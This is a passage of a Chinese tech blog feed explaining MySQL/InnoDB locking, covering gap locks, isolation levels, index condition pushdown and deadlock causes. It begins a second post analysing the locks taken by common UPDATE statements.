&lt;h3 id=&#34;2-6-组合六-id唯一索引-rr&#34;&gt;2.6 组合六：id唯一索引+RR&lt;/h3&gt;

&lt;p&gt;与组合五类似，组合六的加锁，与组合二：&lt;a href=&#34;https://wangzitao6.github.io/2018-08-03-mysql加锁处理分析/#2-2-组合二-id唯一索引-rc&#34;&gt;id唯一索引，Read Committed&lt;/a&gt;一致。两个X锁，id唯一索引满足条件的记录上一个，对应的聚簇索引上的记录一个。&lt;/p&gt;

&lt;h3 id=&#34;２-7-组合七-id非唯一索引-rr&#34;&gt;２.7 组合七：id非唯一索引+RR&lt;/h3&gt;

&lt;p&gt;还记得前面提到的MySQL的四种隔离级别的区别吗？RC隔离级别允许幻读，而RR隔离级别，不允许存在幻读。但是在组合五、组合六中，加锁行为又是与RC下的加锁行为完全一致。那么RR隔离级别下，如何防止幻读呢？问题的答案，就在组合七中揭晓。&lt;/p&gt;

&lt;p&gt;组合七，&lt;code&gt;Repeatable Read隔离级别&lt;/code&gt;，&lt;code&gt;id上有一个非唯一索引&lt;/code&gt;，执行&lt;code&gt;delete from t1 where id = 10;&lt;/code&gt; 假设选择id列上的索引进行条件过滤，最后的加锁行为，是怎么样的呢？同样看下面这幅图：
&lt;img src=&#34;https://wangzitao6.github.io/images/post/18/08/7.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;此图，相对于组合三：&lt;a href=&#34;https://wangzitao6.github.io/2018-08-03-mysql加锁处理分析/#2-3-组合三-id非唯一索引-rc&#34;&gt;id列上非唯一锁，Read Committed&lt;/a&gt;看似相同，其实却有很大的区别。最大的区别在于，这幅图中多了一个GAP锁，而且GAP锁看起来也不是加在记录上的，倒像是加载两条记录之间的位置，GAP锁有何用？&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;其实这个多出来的GAP锁，就是RR隔离级别，相对于RC隔离级别，不会出现幻读的关键&lt;/strong&gt;。确实，GAP锁锁住的位置，也不是记录本身，而是两条记录之间的GAP。所谓幻读，就是同一个事务，连续做两次当前读 (例如：select * from t1 where id = 10 for update;)，那么这两次当前读返回的是完全相同的记录 (记录数量一致，记录本身也一致)，第二次的当前读，不会比第一次返回更多的记录 (幻象)。&lt;/p&gt;

&lt;p&gt;如何保证两次当前读返回一致的记录，那就需要在第一次当前读与第二次当前读之间，其他的事务不会插入新的满足条件的记录并提交。为了实现这个功能，GAP锁应运而生。&lt;/p&gt;

&lt;p&gt;如图中所示，有哪些位置可以插入新的满足条件的项 (id = 10)，考虑到B+树索引的有序性，满足条件的项一定是连续存放的。记录[6,c]之前，不会插入id=10的记录；[6,c]与[10,b]间可以插入[10, aa]；[10,b]与[10,d]间，可以插入新的[10,bb],[10,c]等；[10,d]与[11,f]间可以插入满足条件的[10,e],[10,z]等；而[11,f]之后也不会插入满足条件的记录。因此，为了保证[6,c]与[10,b]间，[10,b]与[10,d]间，[10,d]与[11,f]不会插入新的满足条件的记录，MySQL选择了用GAP锁，将这三个GAP给锁起来。&lt;/p&gt;

&lt;p&gt;&lt;font color=red&gt; &lt;strong&gt;Insert操作，如insert [10,aa]，首先会定位到[6,c]与[10,b]间，然后在插入前，会检查这个GAP是否已经被锁上，如果被锁上，则Insert不能插入记录。因此，通过第一遍的当前读，不仅将满足条件的记录锁上 (X锁)，与组合三[id列上非唯一锁，Read Committed]类似。同时还是增加3把GAP锁，将可能插入满足条件记录的3个GAP给锁上，保证后续的Insert不能插入新的id=10的记录，也就杜绝了同一事务的第二次当前读，出现幻象的情况。&lt;/strong&gt;&lt;/font&gt;&lt;/p&gt;

&lt;p&gt;有心的朋友看到这儿，可以会问：既然防止幻读，需要靠GAP锁的保护，为什么组合五、组合六，也是RR隔离级别，却不需要加GAP锁呢？&lt;/p&gt;

&lt;p&gt;首先，这是一个好问题。其次，回答这个问题，也很简单。GAP锁的目的，是为了防止同一事务的两次当前读，出现幻读的情况。而组合五，id是主键；组合六，id是unique键，都能够保证唯一性。一个等值查询，最多只能返回一条记录，而且新的相同取值的记录，一定不会在新插入进来，因此也就避免了GAP锁的使用。其实，针对此问题，还有一个更深入的问题：如果组合五、组合六下，针对SQL：&lt;code&gt;select * from t1 where id = 10 for update;&lt;/code&gt; 第一次查询，没有找到满足查询条件的记录，那么GAP锁是否还能够省略？此问题留给大家思考。&lt;/p&gt;

&lt;p&gt;结论：&lt;font color=red&gt; Repeatable Read隔离级别下，id列上有一个非唯一索引，对应SQL：&lt;code&gt;delete from t1 where id = 10;&lt;/code&gt; 首先，通过id索引定位到第一条满足查询条件的记录，加记录上的X锁，加GAP上的GAP锁，然后加主键聚簇索引上的记录X锁，然后返回；然后读取下一条，重复进行。直至进行到第一条不满足条件的记录[11,f]，此时，不需要加记录X锁，但是仍旧需要加GAP锁，最后返回结束。&lt;/font&gt;&lt;/p&gt;

&lt;h3 id=&#34;2-8-组合八-id无索引-rr&#34;&gt;2.8 组合八：id无索引+RR&lt;/h3&gt;

&lt;p&gt;组合八，Repeatable Read隔离级别下的最后一种情况，id列上没有索引。此时SQL：&lt;code&gt;delete from t1 where id = 10;&lt;/code&gt; 没有其他的路径可以选择，只能进行全表扫描。最终的加锁情况，如下图所示：
&lt;img src=&#34;https://wangzitao6.github.io/images/post/18/08/8.jpg&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;如图，这是一个很恐怖的现象。首先，聚簇索引上的所有记录，都被加上了X锁。其次，聚簇索引每条记录间的间隙(GAP)，也同时被加上了GAP锁。这个示例表，只有6条记录，一共需要6个记录锁，7个GAP锁。试想，如果表上有1000万条记录呢？&lt;/p&gt;

&lt;p&gt;在这种情况下，这个表上，除了不加锁的快照度，其他任何加锁的并发SQL，均不能执行，不能更新，不能删除，不能插入，全表被锁死。&lt;/p&gt;

&lt;p&gt;当然，跟组合四：&lt;a href=&#34;https://wangzitao6.github.io/2018-08-03-mysql加锁处理分析/#2-4-组合四-id无索引-rc&#34;&gt;id无索引, Read Committed&lt;/a&gt;类似，这个情况下，MySQL也做了一些优化，就是所谓的semi-consistent read。semi-consistent read开启的情况下，对于不满足查询条件的记录，MySQL会提前放锁。针对上面的这个用例，就是除了记录[d,10]，[g,10]之外，所有的记录锁都会被释放，同时不加GAP锁。semi-consistent read如何触发：要么是read committed隔离级别；要么是Repeatable Read隔离级别，同时设置了 &lt;a href=&#34;https://dev.mysql.com/doc/refman/5.5/en/innodb-parameters.html&#34;&gt;innodb_locks_unsafe_for_binlog&lt;/a&gt; 参数。更详细的关于semi-consistent read的介绍，可参考我之前的一篇博客：&lt;a href=&#34;http://hedengcheng.com/?p=220&#34;&gt;MySQL+InnoDB semi-consitent read原理及实现分析&lt;/a&gt; 。&lt;/p&gt;

&lt;p&gt;结论：&lt;strong&gt;在Repeatable Read隔离级别下，如果进行全表扫描的当前读，那么会锁上表中的所有记录，同时会锁上聚簇索引内的所有GAP，杜绝所有的并发 更新/删除/插入 操作。当然，也可以通过触发semi-consistent read，来缓解加锁开销与并发影响，但是semi-consistent read本身也会带来其他问题，不建议使用。&lt;/strong&gt;&lt;/p&gt;

&lt;h3 id=&#34;2-9-组合九-serializable&#34;&gt;2.9 组合九：Serializable&lt;/h3&gt;

&lt;p&gt;针对前面提到的简单的SQL，最后一个情况：Serializable隔离级别。对于SQL2：&lt;code&gt;delete from t1 where id = 10;&lt;/code&gt; 来说，Serializable隔离级别与Repeatable Read隔离级别完全一致，因此不做介绍。&lt;/p&gt;

&lt;p&gt;Serializable隔离级别，影响的是SQL1：&lt;code&gt;select * from t1 where id = 10;&lt;/code&gt; 这条SQL，在RC，RR隔离级别下，都是快照读，不加锁。但是在Serializable隔离级别，SQL1会加读锁，也就是说快照读不复存在，MVCC并发控制降级为Lock-Based CC。&lt;/p&gt;

&lt;p&gt;结论：&lt;font color=red&gt; 在MySQL/InnoDB中，所谓的读不加锁，并不适用于所有的情况，而是隔离级别相关的。Serializable隔离级别，读不加锁就不再成立，所有的读操作，都是当前读。&lt;/font&gt;&lt;/p&gt;

&lt;h2 id=&#34;3-一条复杂的sql&#34;&gt;3 一条复杂的SQL&lt;/h2&gt;

&lt;p&gt;写到这里，其实MySQL的加锁实现也已经介绍的八八九九。只要将本文上面的分析思路，大部分的SQL，都能分析出其会加哪些锁。而这里，再来看一个稍微复杂点的SQL，用于说明MySQL加锁的另外一个逻辑。SQL用例如下：
&lt;img src=&#34;https://wangzitao6.github.io/images/post/18/08/9.jpg&#34; alt=&#34;复杂SQL&#34; /&gt;&lt;/p&gt;

&lt;p&gt;如图中的SQL，会加什么锁？假定在Repeatable Read隔离级别下 (Read Committed隔离级别下的加锁情况，留给读者分析。)，同时，假设SQL走的是idx_t1_pu索引。&lt;/p&gt;

&lt;p&gt;在详细分析这条SQL的加锁情况前，还需要有一个知识储备，那就是一个SQL中的where条件如何拆分？具体的介绍，建议阅读我之前的一篇文章：&lt;a href=&#34;http://hedengcheng.com/?p=577&#34;&gt;SQL中的where条件，在数据库中提取与应用浅析&lt;/a&gt; 。在这里，我直接给出分析后的结果：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Index key：pubtime &amp;gt; 1 and puptime &amp;lt; 20。此条件，用于确定SQL在idx_t1_pu索引上的查询范围。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Index Filter：userid = ‘hdc’ 。此条件，可以在idx_t1_pu索引上进行过滤，但不属于Index Key。&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Table Filter：comment is not NULL。此条件，在idx_t1_pu索引上无法过滤，只能在聚簇索引上过滤。&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;在分析出SQL where条件的构成之后，再来看看这条SQL的加锁情况 (RR隔离级别)，如下图所示：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://wangzitao6.github.io/images/post/18/08/10.jpg&#34; alt=&#34;SQL加锁&#34; /&gt;&lt;/p&gt;

&lt;p&gt;从图中可以看出，在Repeatable Read隔离级别下，由Index Key所确定的范围，被加上了GAP锁；Index Filter锁给定的条件 (userid = ‘hdc’)何时过滤，视MySQL的版本而定，在MySQL 5.6版本之前，不支持Index Condition Pushdown(ICP)，因此Index Filter在MySQL Server层过滤，在5.6后支持了Index Condition Pushdown，则在index上过滤。若不支持ICP，不满足Index Filter的记录，也需要加上记录X锁，若支持ICP，则不满足Index Filter的记录，无需加记录X锁 (图中，用红色箭头标出的X锁，是否要加，视是否支持ICP而定)；而Table Filter对应的过滤条件，则在聚簇索引中读取后，在MySQL Server层面过滤，因此聚簇索引上也需要X锁。最后，选取出了一条满足条件的记录[8,hdc,d,5,good]，但是加锁的数量，要远远大于满足条件的记录数量。&lt;/p&gt;

&lt;p&gt;结论：在Repeatable Read隔离级别下，针对一个复杂的SQL，首先需要提取其where条件。Index Key确定的范围，需要加上GAP锁；Index Filter过滤条件，视MySQL版本是否支持ICP，若支持ICP，则不满足Index Filter的记录，不加X锁，否则需要X锁；Table Filter过滤条件，无论是否满足，都需要加X锁。&lt;/p&gt;

&lt;h2 id=&#34;4-死锁原理与分析&#34;&gt;4 死锁原理与分析&lt;/h2&gt;

&lt;p&gt;本文前面的部分，基本上已经涵盖了MySQL/InnoDB所有的加锁规则。深入理解MySQL如何加锁，有两个比较重要的作用：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;可以根据MySQL的加锁规则，写出不会发生死锁的SQL；&lt;/li&gt;
&lt;li&gt;可以根据MySQL的加锁规则，定位出线上产生死锁的原因；
下面，来看看两个死锁的例子 (一个是两个Session的两条SQL产生死锁；另一个是两个Session的一条SQL，产生死锁)：
&lt;img src=&#34;https://wangzitao6.github.io/images/post/18/08/11.jpg&#34; alt=&#34;死锁用例&#34; /&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;https://wangzitao6.github.io/images/post/18/08/12.jpg&#34; alt=&#34;死锁用例2&#34; /&gt;&lt;/p&gt;

&lt;p&gt;上面的两个死锁用例。第一个非常好理解，也是最常见的死锁，每个事务执行两条SQL，分别持有了一把锁，然后加另一把锁，产生死锁。&lt;/p&gt;

&lt;p&gt;第二个用例，虽然每个Session都只有一条语句，仍旧会产生死锁。要分析这个死锁，首先必须用到本文前面提到的MySQL加锁的规则。针对Session 1，从name索引出发，读到的[hdc, 1]，[hdc, 6]均满足条件，不仅会加name索引上的记录X锁，而且会加聚簇索引上的记录X锁，加锁顺序为先[1,hdc,100]，后[6,hdc,10]。而Session 2，从pubtime索引出发，[10,6],[100,1]均满足过滤条件，同样也会加聚簇索引上的记录X锁，加锁顺序为[6,hdc,10]，后[1,hdc,100]。发现没有，跟Session 1的加锁顺序正好相反，如果两个Session恰好都持有了第一把锁，请求加第二把锁，死锁就发生了。&lt;/p&gt;

&lt;p&gt;结论：死锁的发生与否，并不在于事务中有多少条SQL语句，死锁的关键在于：两个(或以上)的Session加锁的顺序不一致。而使用本文上面提到的，分析MySQL每条SQL语句的加锁规则，分析出每条语句的加锁顺序，然后检查多个并发SQL间是否存在以相反的顺序加锁的情况，就可以分析出各种潜在的死锁情况，也可以分析出线上死锁发生的原因。&lt;/p&gt;

&lt;h2 id=&#34;5-总结&#34;&gt;5 总结&lt;/h2&gt;

&lt;p&gt;写到这儿，本文也告一段落，做一个简单的总结，要做的完全掌握MySQL/InnoDB的加锁规则，甚至是其他任何数据库的加锁规则，需要具备以下的一些知识点：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;了解数据库的一些基本理论知识：数据的存储格式 (堆组织表 vs 聚簇索引表)；并发控制协议 (MVCC vs Lock-Based CC)；Two-Phase Locking；数据库的隔离级别定义 (Isolation Level)；&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;了解SQL本身的执行计划 (主键扫描 vs 唯一键扫描 vs 范围扫描 vs 全表扫描)；&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;了解数据库本身的一些实现细节 (过滤条件提取；Index Condition Pushdown；Semi-Consistent Read)；&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;了解死锁产生的原因及分析的方法 (加锁顺序不一致；分析每个SQL的加锁顺序)&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;有了这些知识点，再加上适当的实战经验，全面掌控MySQL/InnoDB的加锁规则，当不在话下。&lt;/p&gt;

&lt;p&gt;转载自：&lt;a href=&#34;http://hedengcheng.com/?p=771&#34;&gt;何登成的技术博客&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>死锁-常见SQL的语句加锁分析</title>
      <link>https://wangzitao6.github.io/2018-07-29-%E5%B8%B8%E8%A7%81sql%E7%9A%84%E8%AF%AD%E5%8F%A5%E5%8A%A0%E9%94%81%E5%88%86%E6%9E%90</link>
      <pubDate>Sun, 29 Jul 2018 10:20:22 +0800</pubDate>
      
      <guid>https://wangzitao6.github.io/2018-07-29-%E5%B8%B8%E8%A7%81sql%E7%9A%84%E8%AF%AD%E5%8F%A5%E5%8A%A0%E9%94%81%E5%88%86%E6%9E%90</guid>
      <description>

&lt;h1 id=&#34;解决死锁之路-常见-sql-语句的加锁分析&#34;&gt;解决死锁之路 - 常见 SQL 语句的加锁分析&lt;/h1&gt;

&lt;p&gt;这篇博客将对一些常见的 SQL 语句进行加锁分析，看看我们平时执行的那些 SQL 都会加什么锁。只有对我们所写的 SQL 语句加锁过程了如指掌，才能在遇到死锁问题时倒推出是什么锁导致的问题。在前面的博客中我们已经学习了 MySQL 下不同的锁模式和锁类型，我们要特别注意它们的兼容矩阵，熟悉哪些锁是不兼容的，这些不兼容的锁往往就是导致死锁的罪魁祸首。总体来说，MySQL 中的锁可以分成两个粒度：表锁和行锁，表锁有：表级读锁，表级写锁，读意向锁，写意向锁，自增锁；行锁有：读记录锁，写记录锁，间隙锁，Next-key 锁，插入意向锁。不出意外，绝大多数的死锁问题都是由这些锁之间的冲突导致的。&lt;/p&gt;

&lt;p&gt;我们知道，不同的隔离级别加锁也是不一样的，譬如 RR 隔离级别下有间隙锁和 Next-key 锁，这在 RC 隔离级别下是没有的（也有例外），所以在对 SQL 进行加锁分析时，必须得知道数据库的隔离级别。由于 RR 和 RC 用的比较多，所以这篇博客只对这两种隔离级别做分析。&lt;/p&gt;

&lt;p&gt;这是《解决死锁之路》系列博文中的一篇，你还可以阅读其他几篇：&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;http://www.aneasystone.com/archives/2017/10/solving-dead-locks-one.html&#34;&gt;学习事务与隔离级别&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.aneasystone.com/archives/2017/11/solving-dead-locks-two.html&#34;&gt;了解常见的锁类型&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;掌握常见 SQL 语句的加锁分析&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;http://www.aneasystone.com/archives/2018/04/solving-dead-locks-four.html&#34;&gt;死锁问题的分析和解决&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&#34;一-基本的加锁规则&#34;&gt;一、基本的加锁规则&lt;/h2&gt;

&lt;p&gt;虽然 MySQL 的锁各式各样，但是有些基本的加锁原则是保持不变的，譬如：快照读是不加锁的，更新语句肯定是加排它锁的，RC 隔离级别是没有间隙锁的等等。这些规则整理如下，后面就不再重复介绍了：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;常见语句的加锁&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;SELECT &amp;hellip; 语句正常情况下为快照读，不加锁；&lt;/li&gt;
&lt;li&gt;SELECT &amp;hellip; LOCK IN SHARE MODE 语句为当前读，加 S 锁；&lt;/li&gt;
&lt;li&gt;SELECT &amp;hellip; FOR UPDATE 语句为当前读，加 X 锁；&lt;/li&gt;
&lt;li&gt;常见的 DML 语句（如 INSERT、DELETE、UPDATE）为当前读，加 X 锁；&lt;/li&gt;
&lt;li&gt;常见的 DDL 语句（如 ALTER、CREATE 等）加表级锁，且这些语句为隐式提交，不能回滚；&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;表锁&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;表锁（分 S 锁和 X 锁）&lt;/li&gt;
&lt;li&gt;意向锁（分 IS 锁和 IX 锁）&lt;/li&gt;
&lt;li&gt;自增锁（一般见不到，只有在 innodb_autoinc_lock_mode = 0 或者 Bulk inserts 时才可能有）&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;行锁&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;记录锁（分 S 锁和 X 锁）&lt;/li&gt;
&lt;li&gt;间隙锁（分 S 锁和 X 锁）&lt;/li&gt;
&lt;li&gt;Next-key 锁（分 S 锁和 X 锁）&lt;/li&gt;
&lt;li&gt;插入意向锁&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;行锁分析&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;行锁都是加在索引上的，最终都会落在聚簇索引上；&lt;/li&gt;
&lt;li&gt;加行锁的过程是一条一条记录加的；&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;锁冲突&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;S 锁和 S 锁兼容，X 锁和 X 锁冲突，X 锁和 S 锁冲突；&lt;/li&gt;
&lt;li&gt;表锁和行锁的冲突矩阵参见前面的博客 &lt;a href=&#34;http://www.aneasystone.com/archives/2017/11/solving-dead-locks-two.html&#34;&gt;了解常见的锁类型&lt;/a&gt;；&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;不同隔离级别下的锁&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;上面说 SELECT &amp;hellip; 语句正常情况下为快照读，不加锁；但是在 Serializable 隔离级别下为当前读，加 S 锁；&lt;/li&gt;
&lt;li&gt;RC 隔离级别下没有间隙锁和 Next-key 锁（特殊情况下也会有：purge + unique key）；&lt;/li&gt;
&lt;li&gt;不同隔离级别下锁的区别，参见前面的博客 &lt;a href=&#34;http://www.aneasystone.com/archives/2017/10/solving-dead-locks-one.html&#34;&gt;学习事务与隔离级别&lt;/a&gt;；&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;二-简单-sql-的加锁分析&#34;&gt;二、简单 SQL 的加锁分析&lt;/h2&gt;

&lt;p&gt;何登成前辈在他的博客&lt;a href=&#34;http://hedengcheng.com/?p=771&#34;&gt;《MySQL 加锁处理分析》&lt;/a&gt;中对一些常见的 SQL 加锁进行了细致的分析，这篇博客可以说是网上介绍 MySQL 加锁分析的一个范本，网上几乎所有关于加锁分析的博客都是参考了这篇博客，勘称经典，强烈推荐。我这里也不例外，只是在他的基础上进行了一些整理和总结。&lt;/p&gt;

&lt;p&gt;我们使用下面这张 students 表作为实例，其中 id 为主键，no（学号）为二级唯一索引，name（姓名）和 age（年龄）为二级非唯一索引，score（学分）无索引。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://www.aneasystone.com/usr/uploads/2017/11/1845259072.png&#34; alt=&#34;students-table.png&#34; title=&#34;students-table.png&#34; /&gt;&lt;/p&gt;

&lt;p&gt;这一节我们只分析最简单的一种 SQL，它只包含一个 WHERE 条件，等值查询或范围查询。虽然 SQL 非常简单，但是针对不同类型的列，我们还是会面对各种情况：&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;聚簇索引，查询命中：UPDATE students SET score = 100 WHERE id = 15;&lt;/li&gt;
&lt;li&gt;聚簇索引，查询未命中：UPDATE students SET score = 100 WHERE id = 16;&lt;/li&gt;
&lt;li&gt;二级唯一索引，查询命中：UPDATE students SET score = 100 WHERE no = &amp;lsquo;S0003&amp;rsquo;;&lt;/li&gt;
&lt;li&gt;二级唯一索引，查询未命中：UPDATE students SET score = 100 WHERE no = &amp;lsquo;S0008&amp;rsquo;;&lt;/li&gt;
&lt;li&gt;二级非唯一索引，查询命中：UPDATE students SET score = 100 WHERE name = &amp;lsquo;Tom&amp;rsquo;;&lt;/li&gt;
&lt;li&gt;二级非唯一索引，查询未命中：UPDATE students SET score = 100 WHERE name = &amp;lsquo;John&amp;rsquo;;&lt;/li&gt;
&lt;li&gt;无索引：UPDATE students SET score = 100 WHERE score = 22;&lt;/li&gt;
&lt;li&gt;聚簇索引，范围查询：UPDATE students SET score = 100 WHERE id &amp;lt;= 20;&lt;/li&gt;
&lt;li&gt;二级索引，范围查询：UPDATE students SET score = 100 WHERE age &amp;lt;= 23;&lt;/li&gt;
&lt;li&gt;修改索引值：UPDATE students SET name = &amp;lsquo;John&amp;rsquo; WHERE id = 15;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;2-1-聚簇索引-查询命中&#34;&gt;2.1 聚簇索引，查询命中&lt;/h3&gt;

&lt;p&gt;语句 &lt;code&gt;UPDATE students SET score = 100 WHERE id = 15&lt;/code&gt; 在 RC 和 RR 隔离级别下加锁情况一样，都是对 id 这个聚簇索引加 X 锁，如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://www.aneasystone.com/usr/uploads/2017/11/3772354388.png&#34; alt=&#34;primary-index-locks.png&#34; title=&#34;primary-index-locks.png&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;2-2-聚簇索引-查询未命中&#34;&gt;2.2 聚簇索引，查询未命中&lt;/h3&gt;

&lt;p&gt;如果查询未命中纪录，在 RC 和 RR 隔离级别下加锁是不一样的，因为 RR 有 GAP 锁。语句 &lt;code&gt;UPDATE students SET score = 100 WHERE id = 16&lt;/code&gt; 在 RC 和 RR 隔离级别下的加锁情况如下（RC 不加锁）：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://www.aneasystone.com/usr/uploads/2017/11/1134815826.png&#34; alt=&#34;primary-index-locks-gap.png&#34; title=&#34;primary-index-locks-gap.png&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;2-3-二级唯一索引-查询命中&#34;&gt;2.3 二级唯一索引，查询命中&lt;/h3&gt;

&lt;p&gt;语句 &lt;code&gt;UPDATE students SET score = 100 WHERE no = &#39;S0003&#39;&lt;/code&gt; 命中二级唯一索引，上一篇博客中我们介绍了索引的结构，我们知道二级索引的叶子节点中保存了主键索引的位置，在给二级索引加锁的时候，主键索引也会一并加锁。这个在 RC 和 RR 两种隔离级别下没有区别：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://www.aneasystone.com/usr/uploads/2017/11/3264452282.png&#34; alt=&#34;secondary-index-unique-locks.png&#34; title=&#34;secondary-index-unique-locks.png&#34; /&gt;&lt;/p&gt;

&lt;p&gt;那么，为什么主键索引上的记录也要加锁呢？因为有可能其他事务会根据主键对 students 表进行更新，如：&lt;code&gt;UPDATE students SET score = 100 WHERE id = 20&lt;/code&gt;，试想一下，如果主键索引没有加锁，那么显然会存在并发问题。&lt;/p&gt;

&lt;h3 id=&#34;2-4-二级唯一索引-查询未命中&#34;&gt;2.4 二级唯一索引，查询未命中&lt;/h3&gt;

&lt;p&gt;如果查询未命中纪录，和 2.2 情况一样，RR 隔离级别会加 GAP 锁，RC 无锁。语句 &lt;code&gt;UPDATE students SET score = 100 WHERE no = &#39;S0008&#39;&lt;/code&gt; 加锁情况如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://www.aneasystone.com/usr/uploads/2017/11/1874377945.png&#34; alt=&#34;secondary-index-unique-locks-gap.png&#34; title=&#34;secondary-index-unique-locks-gap.png&#34; /&gt;&lt;/p&gt;

&lt;p&gt;这种情况下只会在二级索引加锁，不会在聚簇索引上加锁。&lt;/p&gt;

&lt;h3 id=&#34;2-5-二级非唯一索引-查询命中&#34;&gt;2.5 二级非唯一索引，查询命中&lt;/h3&gt;

&lt;p&gt;如果查询命中的是二级非唯一索引，在 RR 隔离级别下，还会加 GAP 锁。语句 &lt;code&gt;UPDATE students SET score = 100 WHERE name = &#39;Tom&#39;&lt;/code&gt; 加锁如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://www.aneasystone.com/usr/uploads/2017/11/412778305.png&#34; alt=&#34;secondary-index-non-unique-locks.png&#34; title=&#34;secondary-index-non-unique-locks.png&#34; /&gt;&lt;/p&gt;

&lt;p&gt;为什么非唯一索引会加 GAP 锁，而唯一索引不用加 GAP 锁呢？原因很简单，GAP 锁的作用是为了解决幻读，防止其他事务插入相同索引值的记录，而唯一索引和主键约束都已经保证了该索引值肯定只有一条记录，所以无需加 GAP 锁。&lt;/p&gt;

&lt;p&gt;这里还有一点要注意一下，数一数右图中的锁你可能会觉得一共加了 7 把锁，实际情况不是，要注意的是 (Tom, 37) 上的记录锁和它前面的 GAP 锁合起来是一个 Next-key 锁，这个锁加在 (Tom, 37) 这个索引上，另外 (Tom, 49) 上也有一把 Next-key 锁。那么最右边的 GAP 锁加在哪呢？右边已经没有任何记录了啊。其实，在 InnoDb 存储引擎里，每个数据页中都会有两个虚拟的行记录，用来限定记录的边界，分别是：&lt;code&gt;Infimum Record&lt;/code&gt; 和 &lt;code&gt;Supremum Record&lt;/code&gt;，Infimum 是比该页中任何记录都要小的值，而 Supremum 比该页中最大的记录值还要大，这两条记录在创建页的时候就有了，并且不会删除。上面右边的 GAP 锁就是加在 Supremum Record 上。所以说，上面右图中共有 2 把 Next-key 锁，1 把 GAP 锁，2 把记录锁，一共 5 把锁。&lt;/p&gt;

&lt;h3 id=&#34;2-6-二级非唯一索引-查询未命中&#34;&gt;2.6 二级非唯一索引，查询未命中&lt;/h3&gt;

&lt;p&gt;如果查询未命中纪录，和 2.2、2.4 情况一样，RR 隔离级别会加 GAP 锁，RC 无锁。语句 &lt;code&gt;UPDATE students SET score = 100 WHERE name = &#39;John&#39;&lt;/code&gt; 加锁情况如下：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://www.aneasystone.com/usr/uploads/2017/11/3618764093.png&#34; alt=&#34;secondary-index-non-unique-locks-gap.png&#34; title=&#34;secondary-index-non-unique-locks-gap.png&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;2-7-无索引&#34;&gt;2.7 无索引&lt;/h3&gt;

&lt;p&gt;如果 WHERE 条件不能走索引，MySQL 会如何加锁呢？有的人说会在表上加 X 锁，也有人说会根据 WHERE 条件将筛选出来的记录在聚簇索引上加上 X 锁，那么究竟如何，我们看下图：&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;http://www.aneasystone.com/usr/uploads/2017/11/3641345061.png&#34; alt=&#34;no-index-locks.png&#34; title=&#34;no-index-locks.png&#34; /&gt;&lt;/p&gt;

&lt;p&gt;在没有索引的时候，只能走聚簇索引，对表中的记录进行全表扫描。在 RC 隔离级别下会给所有记录加行锁，在 RR 隔离级别下，不仅会给所有记录加行锁，所有聚簇索引和聚簇索引之间还会加上 GAP 锁。&lt;/p&gt;

&lt;p&gt;语句 &lt;code&gt;UPDATE students SET score = 100 WHERE score = 22&lt;/code&gt; 满足条件的虽然只有 1 条记录，但是聚簇索引上所有的记录，都被加上了 X 锁。那么，为什么不是只在满足条件的记录上加锁呢？这是由于 MySQL 的实现决定的。如果一个条件无法通过索引快速过滤，那么存储引擎层面就会将所有记录加锁后返回，然后由 MySQL Server 层进行过滤，因此也就把所有的记录都锁上了。&lt;/p&gt;

